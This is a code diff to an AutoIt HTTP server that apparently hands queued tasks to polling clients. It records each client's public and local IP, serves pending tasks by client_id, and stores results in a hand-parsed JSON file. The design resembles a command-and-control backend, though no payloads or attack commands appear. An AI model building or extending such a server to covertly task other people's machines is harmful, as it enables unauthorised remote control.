@@ -15,7 +15,7 @@
 ; ---------- Globals ----------
 Global $gSrvSock = -1, $gPort = 8080
 Global $gClientsFile = @ScriptDir & "\..\db\clients.csv"
-Global $gTasksFile = @ScriptDir & "\..\db\tasks.csv"
+Global $gTasksFile = @ScriptDir & "\..\db\tasks.json"
 Global $gAttachedLog = -1, $gAttachedLV = -1
 Global $gApiKey = EnvGet("X_API_KEY") ; optional auth header for /cb & /task_result
 Global Const $MAX_BODY = 1048576 ; 1MB cap
@@ -226,14 +226,21 @@ Func _HandleCB(ByRef $req, $cSock)
 EndFunc
 
 Func _HandleTasks(ByRef $req, $cSock)
-    Local $cid = _QueryGet($req.Item("query"), "client_id")
+    Local $query = $req.Item("query")
+    _LogUI("[TASKS] Query string: '" & $query & "'")
+    
+    Local $cid = _QueryGet($query, "client_id")
+    _LogUI("[TASKS] Parsed client_id: '" & $cid & "'")
+    
     If $cid = "" Then
+        _LogUI("[TASKS] ERROR: Missing client_id")
         _SendHTTP($cSock, 400, "application/json", '{"error":"missing client_id"}')
         Return
     EndIf
 
     Local $row = _DB_GetNextTask($cid)
     If @error Or UBound($row) = 0 Then
+        _LogUI("[TASKS] No pending tasks for " & $cid)
         _SendEmpty($cSock, 204)
         Return
     EndIf
@@ -304,11 +311,11 @@ Func _DB_Startup()
         EndIf
     EndIf
     
-    ; Create tasks.csv with header if not exists
+    ; Create tasks.json as empty array if not exists
     If Not FileExists($gTasksFile) Then
         Local $h = FileOpen($gTasksFile, 2)
         If $h <> -1 Then
-            FileWrite($h, "task_id,client_id,type,args,status,result,created_at,executed_at" & @CRLF)
+            FileWrite($h, "[]")
             FileClose($h)
         EndIf
     EndIf
@@ -352,18 +359,159 @@ Func _DB_UpsertClient($cid, $ip_public, $ip_local, $status, $message, $ts)
 EndFunc
 
 Func _DB_GetNextTask($cid)
-    ; Placeholder - no tasks for now
+    ; Read tasks.json and find first pending task for this client
+    Local $json = _ReadFile($gTasksFile)
+    _LogUI("[DB] JSON content: " & StringLeft($json, 200))
+    
+    If $json = "" Or $json = "[]" Then
+        _LogUI("[DB] Empty tasks file")
+        Local $empty[0]
+        SetError(1)
+        Return $empty
+    EndIf
+    
+    ; Parse JSON array manually - find first pending task
+    ; Format: [{"task_id":"...","client_id":"...","type":"...","args":{...},"status":"...",...],...]
+    Local $pattern = '\{"task_id":"([^"]+)","client_id":"([^"]+)","type":"([^"]+)","args":([^,]+),"status":"([^"]+)"'
+    Local $matches = StringRegExp($json, $pattern, 3)  ; Global mode
+    
+    _LogUI("[DB] Regex matches: " & UBound($matches))
+    
+    If @error Or UBound($matches) = 0 Then
+        Local $empty[0]
+        SetError(1)
+        Return $empty
+    EndIf
+    
+    ; Matches array: [task_id, client_id, type, args, status, task_id2, client_id2, ...]
+    For $i = 0 To UBound($matches) - 1 Step 5
+        Local $task_id = $matches[$i]
+        Local $task_cid = $matches[$i + 1]
+        Local $task_type = $matches[$i + 2]
+        Local $task_args = $matches[$i + 3]
+        Local $task_status = $matches[$i + 4]
+        
+        If $task_cid = $cid And $task_status = "pending" Then
+            Local $ret[3]
+            $ret[0] = $task_id
+            $ret[1] = $task_type
+            $ret[2] = $task_args
+            Return $ret
+        EndIf
+    Next
+    
     Local $empty[0]
     SetError(1)
     Return $empty
 EndFunc
 
 Func _DB_MarkTaskSent($task_id)
-    ; Placeholder
+    ; Update task status to 'sent' and mark executed_at
+    Local $json = _ReadFile($gTasksFile)
+    If $json = "" Then Return
+    
+    ; Find task by task_id and update fields
+    Local $searchTask = '"task_id":"' & $task_id & '"'
+    Local $pos = StringInStr($json, $searchTask)
+    If $pos > 0 Then
+        ; Update status from pending to sent
+        Local $statusPos = StringInStr($json, '"status":"pending"', 0, 1, $pos)
+        If $statusPos > 0 Then
+            $json = StringLeft($json, $statusPos - 1) & '"status":"sent"' & StringMid($json, $statusPos + 18)
+        EndIf
+        
+        ; Update executed_at timestamp
+        Local $execPos = StringInStr($json, '"executed_at":""', 0, 1, $pos)
+        If $execPos > 0 Then
+            $json = StringLeft($json, $execPos - 1) & '"executed_at":"' & _NowTs() & '"' & StringMid($json, $execPos + 16)
+        EndIf
+    EndIf
+    
+    Local $h = FileOpen($gTasksFile, 2)
+    If $h <> -1 Then
+        FileWrite($h, $json)
+        FileClose($h)
+    EndIf
 EndFunc
 
 Func _DB_SaveResult($task_id, $ok, $result, $err)
-    ; Placeholder
+    ; Update task with result - simple string replace approach
+    Local $json = _ReadFile($gTasksFile)
+    If $json = "" Then Return
+    
+    Local $status = $ok ? "completed" : "failed"
+    Local $resultText = $ok ? $result : $err
+    Local $resultEsc = _JsonEscStr($resultText)
+    
+    _LogUI("[DB_SaveResult] task_id=" & $task_id & " status=" & $status & " result_len=" & StringLen($resultEsc))
+    
+    ; Find the task object and update status and result
+    ; Use simpler string replace instead of complex regex
+    ; First replace status for this specific task_id
+    Local $searchStatus = '"task_id":"' & $task_id & '"'
+    Local $pos = StringInStr($json, $searchStatus)
+    If $pos > 0 Then
+        ; Find status field after task_id
+        Local $statusPos = StringInStr($json, '"status":"pending"', 0, 1, $pos)
+        If $statusPos > 0 Then
+            $json = StringLeft($json, $statusPos - 1) & '"status":"' & $status & '"' & StringMid($json, $statusPos + 18)
+        EndIf
+        
+        ; Find result field after task_id
+        Local $resultPos = StringInStr($json, '"result":""', 0, 1, $pos)
+        If $resultPos > 0 Then
+            $json = StringLeft($json, $resultPos - 1) & '"result":"' & $resultEsc & '"' & StringMid($json, $resultPos + 11)
+        EndIf
+    EndIf
+    
+    _LogUI("[DB_SaveResult] Updated JSON (first 200 chars): " & StringLeft($json, 200))
+    
+    Local $h = FileOpen($gTasksFile, 2)
+    If $h <> -1 Then
+        FileWrite($h, $json)
+        FileClose($h)
+    EndIf
+EndFunc
+
+; Queue a new task (called from GUI)
+Func _DB_QueueTask($cid, $type, $args)
+    ; Generate task_id
+    Local $task_id = "task_" & @YEAR & @MON & @MDAY & "_" & @HOUR & @MIN & @SEC & "_" & Random(1000, 9999, 1)
+    
+    ; Read existing tasks
+    Local $json = _ReadFile($gTasksFile)
+    If $json = "" Or $json = "[]" Then $json = "[]"
+    
+    ; Build new task object
+    Local $taskObj = '{"task_id":"' & $task_id & '","client_id":"' & $cid & '","type":"' & $type & _
+                     '","args":' & $args & ',"status":"pending","result":"","created_at":"' & _NowTs() & _
+                     '","executed_at":""}'
+    
+    ; Insert into array
+    If $json = "[]" Then
+        $json = "[" & $taskObj & "]"
+    Else
+        ; Insert before closing bracket
+        $json = StringTrimRight($json, 1) & "," & $taskObj & "]"
+    EndIf
+    
+    ; Write back
+    Local $h = FileOpen($gTasksFile, 2)
+    If $h <> -1 Then
+        FileWrite($h, $json)
+        FileClose($h)
+    EndIf
+EndFunc
+
+; Helper to escape strings for JSON
+Func _JsonEscStr($s)
+    $s = StringReplace($s, "\\", "\\\\")
+    $s = StringReplace($s, '"', '\"')
+    $s = StringReplace($s, @CRLF, "\n")
+    $s = StringReplace($s, @LF, "\n")
+    $s = StringReplace($s, @CR, "\r")
+    $s = StringReplace($s, @TAB, "\t")
+    Return $s
 EndFunc
 
 ; Get clients list for GUI ListView (returns 2D array)
